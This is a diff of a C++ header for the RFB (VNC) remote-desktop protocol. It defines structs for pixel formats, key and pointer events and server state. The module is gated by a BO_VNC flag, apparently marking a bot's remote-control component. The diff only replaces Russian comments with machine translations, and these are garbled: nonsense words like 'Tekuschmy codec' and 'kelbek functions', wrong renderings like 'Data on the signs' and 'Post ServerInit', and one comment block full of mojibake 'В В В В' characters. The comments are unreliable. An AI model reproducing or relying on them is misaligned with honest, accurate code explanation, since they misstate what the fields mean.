@@ -1,13 +1,14 @@
 /*
   Протокол RFB.
   На основе http://www.uvnc.com/
+
 */
 #pragma once
 
 #if(BO_VNC > 0)
 namespace Rfb
 {
-  //Типы авторизации.
+  //Types of authorization.
   enum
   {
     ST_INVALID = 0,
@@ -16,7 +17,7 @@ namespace Rfb
     ST_ERROR   = 0xFFFFFFFF
   };
 
-  //Типы кодеков.
+  //Types of codecs.
   enum  
   {
     ENCODER_Raw         = 0, 
@@ -25,7 +26,7 @@ namespace Rfb
   };
 
   #pragma pack(push, 1)
-  //Формат пикселя.
+  //Pixel format.
   typedef struct
   {
     BYTE bBitsPerPixel;
@@ -44,7 +45,7 @@ namespace Rfb
     BYTE bPadding[3];
   }PIXEL_FORMAT;
 
-  //Сообщение ServerInit.
+  //Post ServerInit.
   typedef struct
   {
     WORD wFrameBufferWidth;
@@ -53,7 +54,7 @@ namespace Rfb
     DWORD dwNameLength;
   }MSG_SERVERINIT;
 
-  //Координаты квадрата.
+  //The coordinates of the square.
   typedef struct
   {
     BYTE bIncremental;
@@ -72,7 +73,7 @@ namespace Rfb
     DWORD dwEncodingType;
   }RECTANGLEEX;
   
-  //Данные о клавише.
+  //Data on the key.
   typedef struct
   {
     BYTE bIsDown;
@@ -80,7 +81,7 @@ namespace Rfb
     DWORD dwKeyCode;
   }EVENT_KEY;
   
-  //Данные о указатели.
+  //Data on the signs.
   typedef struct
   {
     BYTE bButtonMask;
@@ -89,11 +90,11 @@ namespace Rfb
   }EVENT_POINTER;
   #pragma pack(pop)
 
-  //Внутрии данные сервера.
+  //Inside the server data.
   typedef struct
   {
-    HDC memoryDc;           //DC для работы.
-    HBITMAP originalBitmap; //Исходый битмап memoryDc.
+    HDC memoryDc;           //DC for work.
+    HBITMAP originalBitmap; //Outcomes bitmap memoryDc.
 
     WORD wWidth;
     WORD wHeight;
@@ -102,24 +103,24 @@ namespace Rfb
     HBITMAP hBitmap;
     LPBYTE pBmpDIB;
     LPBYTE pBmpDIBOld;
-    void *pHextileBuffer; //Внутренний буфер для кодека Hextile.
+    void *pHextileBuffer; //Internal buffer for the codec Hextile.
     
     PIXEL_FORMAT pfLocalPixel;
     BYTE bLocalPixelSize;
     PIXEL_FORMAT pfRemotePixel;
     BYTE bRemotePixelSize;
 
-    LPDWORD dwEncodingsList;       //Список кодеков, которые поддерживает клиент
-    WORD wEncodingsCount;          //Количество кодеков, которые поддерживает клиент
-    DWORD dwCurrentEncoder;        //Текущмй кодек.
-    DWORD dwCurrentEncoderSwapped; //BigEndian ид кодека.
+    LPDWORD dwEncodingsList;       //List of codecs that are supported by client
+    WORD wEncodingsCount;          //Number of codecs that are supported by client
+    DWORD dwCurrentEncoder;        //Tekuschmy codec.
+    DWORD dwCurrentEncoderSwapped; //BigEndian Id codec.
   }INTERNAL_DATA;
 
-  //Структура с кэлбэк функциями, используемыми в ходе работы сервера.
-  //ПРИМЕЧАНИЕ: Все WORD, DWORD указываются в LITTLE ENDIAN (т.е. нормально).
+  //Structure with kelbek functions used in the course of the server.
+  //NOTE: All WORD, DWORD specified in LITTLE ENDIAN (ie normal).
   typedef struct 
   {
-    void *param; //Произвольный параметр для функций.
+    void *param; //Arbitrary parameter functions.
 
     /*
       Установка способа авторизации на сервере.
@@ -214,15 +215,14 @@ namespace Rfb
   */
   bool _SendBell(SOCKET s);
   
-  /*
-    Отправить "буферный" текст клиенту.
-    
-    IN s        - сокет клиента.
-    IN pstrText - текст для отправки.
+  /*В В В В Send a "buffer" the text to the client.
+В В В В 
+В В В В IN s - the client socket.
+В В В В IN pstrText - text to send.
 
-    Return - true - в случаи успеха,
-             false - в случаи ошибки.
-  */
+В В В В Return - true - if successful,
+В В В В В В В В В В В В В false - if an error occurs.
+В В */
   bool _CopyText(SOCKET s, LPSTR pstrText);
 };
 
